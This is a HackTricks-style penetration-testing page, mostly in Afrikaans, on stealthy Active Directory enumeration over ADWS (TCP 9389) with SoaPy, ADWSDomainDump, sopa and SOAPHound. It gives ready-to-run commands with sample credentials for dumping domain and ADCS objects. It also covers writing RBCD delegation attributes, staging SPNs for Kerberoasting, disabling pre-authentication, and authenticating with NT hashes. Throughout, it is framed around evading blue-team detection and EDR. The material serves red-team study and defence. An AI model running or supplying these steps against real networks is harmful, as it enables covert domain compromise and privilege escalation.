# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Active Directory Web Services (ADWS) is **standaard geaktiveer op elke Domain Controller sedert Windows Server 2008 R2** en luister op TCP **9389**. Ten spyte van die naam, **geen HTTP is betrokke nie**. In plaas daarvan gee die diens LDAP-styl data bloot deur 'n stapel eienaarskap .NET framing-protokolle:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Aangesien die verkeer binne hierdie binêre SOAP-frames gekapsel is en oor 'n ongewone poort gaan, is **enumeration deur ADWS veel minder waarskynlik om ondersoek, gefilter of signatured te word as klassieke LDAP/389 & 636-verkeer**. Vir operateurs beteken dit:

* Stealthier recon – Blue teams vaak konsentreer op LDAP-queries.
* Vryheid om van **non-Windows hosts (Linux, macOS)** te versamel deur 9389/TCP deur 'n SOCKS-proxy te tunnel.
* Dieselfde data as wat jy via LDAP sou kry (users, groups, ACLs, schema, ens.) en die vermoë om **writes** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

ADWS-interaksies word geïmplementeer oor WS-Enumeration: elke query begin met 'n `Enumerate`-boodskap wat die LDAP-filter/attributte definieer en 'n `EnumerationContext` GUID teruggee, gevolg deur een of meer `Pull`-boodskappe wat tot by die deur die bediener gedefinieerde resultaatvenster stroom. Kontekste verval na ~30 minute, dus moet gereedskap óf resultate page óf filters opsplits (prefix queries per CN) om te voorkom dat staat verlore gaan. Wanneer jy vir security descriptors vra, spesifiseer die `LDAP_SERVER_SD_FLAGS_OID` control om SACLs uit te sluit; anders gooi ADWS net die `nTSecurityDescriptor`-attribuut uit sy SOAP-antwoord.

> NOTE: ADWS word ook gebruik deur baie RSAT GUI/PowerShell tools, so verkeer kan met wettige admin-aktiwiteit meng.

## SoaPy – Inheemse Python-kliënt

[SoaPy](https://github.com/logangoins/soapy) is 'n **volledige herimplementering van die ADWS protocol stack in suiwer Python**. Dit bou die NBFX/NBFSE/NNS/NMF-frames byte-vir-byte, wat versameling vanaf Unix-agtige stelsels moontlik maak sonder om die .NET runtime te raak.

### Sleutelkenmerke

* Ondersteun **proxying through SOCKS** (nuttig vanaf C2 implants).
* Fynkorrelige soekfilters identies aan LDAP `-q '(objectClass=user)'`.
* Opsionele **write**-operasies (`--set` / `--delete`).
* **BOFHound output mode** vir direkte invoer in BloodHound.
* `--parse` vlag om tydstempels / `userAccountControl` netjies te formateer wanneer menslike leesbaarheid benodig word.

### Targeted collection flags & write operations

SoaPy kom met gekurateeerde skakelaars wat die mees algemene LDAP-hunting take oor ADWS repliseer: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` knoppies vir pasgemaakte pulls. Kombineer dit met write-primitives soos `--rbcd <source>` (stel `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging vir gerigte Kerberoasting) en `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Gebruik dieselfde host/credentials om bevindinge onmiddellik te weaponise: dump RBCD-capable objects met `--rbcds`, en pas dan `--rbcd 'WEBSRV01$' --account 'FILE01$'` toe om 'n Resource-Based Constrained Delegation chain op te stel (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) vir die volledige misbruikpad).

### Installasie (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump oor ADWS (Linux/Windows)

* Vork van `ldapdomaindump` wat LDAP-navrae ruil vir ADWS-oproepe op TCP/9389 om LDAP-signature hits te verminder.
* Voer 'n aanvanklike bereikbaarheidskontrole na 9389 uit tensy `--force` deurgegee word (sla die probe oor as poortskanderings luidrugtig/gefilter is).
* Getoets teen Microsoft Defender for Endpoint en CrowdStrike Falcon met 'n suksesvolle bypass in die README.

### Installasie
```bash
pipx install .
```
### Gebruik
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipiese uitset registreer die 9389-bereikbaarheidstoets, ADWS bind, en dump begin/einde:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - A practical client for ADWS in Golang

Net soos soapy, [sopa](https://github.com/Macmod/sopa) implementeer die ADWS-protokolstapel (MS-NNS + MC-NMF + SOAP) in Golang en stel opdragreëlvlagte beskikbaar om ADWS-oproepe te maak soos:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* en ander soos `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ens.

### Protocol mapping highlights

* LDAP-styl soektogte word uitgevoer via **WS-Enumeration** (`Enumerate` + `Pull`) met attribuutprojektering, omvangbeheer (Base/OneLevel/Subtree) en paginering.
* Enkel-objek-ophaling gebruik **WS-Transfer** `Get`; attribuutveranderings gebruik `Put`; verwyderings gebruik `Delete`.
* Ingeboude objekskepping gebruik **WS-Transfer ResourceFactory**; pasgemaakte objekke gebruik 'n **IMDA AddRequest** gedryf deur YAML-sjablone.
* Wagwoordoperasies is **MS-ADCAP** aksies (`SetPassword`, `ChangePassword`).

### Unauthenticated metadata discovery (mex)

ADWS openbaar WS-MetadataExchange sonder inlogbewyse, wat 'n vinnige manier is om blootstelling te verifieer voordat u outentiseer:
```bash
sopa mex --dc <DC>
```
### DNS/DC ontdekking & Kerberos teiken-aantekeninge

Sopa kan DCs via SRV oplos as `--dc` weggelaat word en `--domain` verskaf word. Dit voer navrae in hierdie volgorde uit en gebruik die doelwit met die hoogste prioriteit:
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operationeel, verkies 'n DC-beheerde resolver om mislukkings in gesegmenteerde omgewings te vermy:

* Gebruik `--dns <DC-IP>` sodat **alle** SRV/PTR/forward-opsoeke via die DC DNS verloop.
* Gebruik `--dns-tcp` wanneer UDP geblokkeer is of SRV-antwoorde groot is.
* As Kerberos geaktiveer is en `--dc` 'n IP is, voer sopa 'n **reverse PTR** uit om 'n FQDN te verkry vir korrekte SPN/KDC-rigtering. As Kerberos nie gebruik word nie, word geen PTR-opsoek uitgevoer nie.

Voorbeeld (IP + Kerberos, gedwonge DNS via die DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opsies vir verifikasiemateriaal

Benewens plaintext passwords, ondersteun sopa **NT hashes**, **Kerberos AES keys**, **ccache**, en **PKINIT certificates** (PFX of PEM) vir ADWS auth. Kerberos is geïmpliseer wanneer `--aes-key`, `-c` (ccache) of sertifikaatgebaseerde opsies gebruik word.
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Aangepaste objekskepping via sjablone

Vir arbitraire objekklasse gebruik die `create custom` opdrag 'n YAML-sjabloon wat ooreenstem met 'n IMDA `AddRequest`:

* `parentDN` en `rdn` definieer die houer en relatiewe DN.
* `attributes[].name` ondersteun `cn` of namespaced `addata:cn`.
* `attributes[].type` aanvaar `string|int|bool|base64|hex` of eksplisiete `xsd:*`.
* Moet **nie** `ad:relativeDistinguishedName` of `ad:container-hierarchy-parent` insluit nie; sopa injekteer hulle.
* `hex`-waardes word omgeskakel na `xsd:base64Binary`; gebruik `value: ""` om leë stringe te stel.

## SOAPHound – Hoë-volume ADWS-versameling (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is 'n .NET-versamelaar wat alle LDAP-interaksies binne ADWS hou en BloodHound v4-verenigbare JSON uitstuur. Dit bou een keer 'n volledige kas van `objectSid`, `objectGUID`, `distinguishedName` en `objectClass` (`--buildcache`), en hergebruik dit dan vir hoë-volume `--bhdump`, `--certdump` (ADCS), of `--dnsdump` (AD-geïntegreerde DNS) passe sodat net sowat ~35 kritieke attributte ooit die DC verlaat. AutoSplit (`--autosplit --threshold <N>`) deel navrae outomaties op volgens CN-voorvoegsel om binne die 30-minute EnumerationContext-timeout in groot forests te bly.

Tipiese werkvloei op 'n domein-aangeslote operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Geëxporteerde JSON-slots direk in SharpHound/BloodHound-workflows geїmporteer—sien [BloodHound methodology](bloodhound.md) vir idees oor afgeleide grafieke. AutoSplit maak SOAPHound veerkragtig op multi-miljoen-objekbosse terwyl dit die navraagtelling laer hou as ADExplorer-styl snapshots.

## Onopvallende AD-versamelingswerkvloei

Die volgende werkvloei wys hoe om te enumereer **domain & ADCS objects** oor ADWS, dit na BloodHound JSON om te skakel en te soek na sertifikaat-gebaseerde aanvalspaaie – alles vanaf Linux:

1. **Tunnel 9389/TCP** vanaf die teiken-netwerk na jou masjien (bv. via Chisel, Meterpreter, SSH dynamic port-forward, ens.).  Eksporteer `export HTTPS_PROXY=socks5://127.0.0.1:1080` of gebruik SoaPy’s `--proxyHost/--proxyPort`.

2. **Versamel die wortel-domein-objek:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Versamel ADCS-verwante objekte uit die Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Omskep na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laai die ZIP op** in die BloodHound GUI en voer cypher queries soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` uit om sertifikaat-eskalasie-paaie (ESC1, ESC8, ens.) te openbaar.

### Skryf `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombineer dit met `s4u2proxy`/`Rubeus /getticket` vir 'n volledige **Resource-Based Constrained Delegation** ketting (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Opsomming van Gereedskap

| Doel | Gereedskap | Aantekeninge |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lees/skryf |
| Hoë-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Skakel SoaPy/ldapsearch-logboeke om |
| Sertifikaat kompromittering | [Certipy](https://github.com/ly4k/Certipy) | Kan deur dieselfde SOCKS geproxy word |
| ADWS enumeration & voorwerpveranderinge | [sopa](https://github.com/Macmod/sopa) | Generiese kliënt om te koppel aan bekende ADWS-endpunte - laat toe: enumeration, objekskepping, attribuutwysigings, en wagwoordveranderinge |

## Verwysings

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Sopa GitHub](https://github.com/Macmod/sopa)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
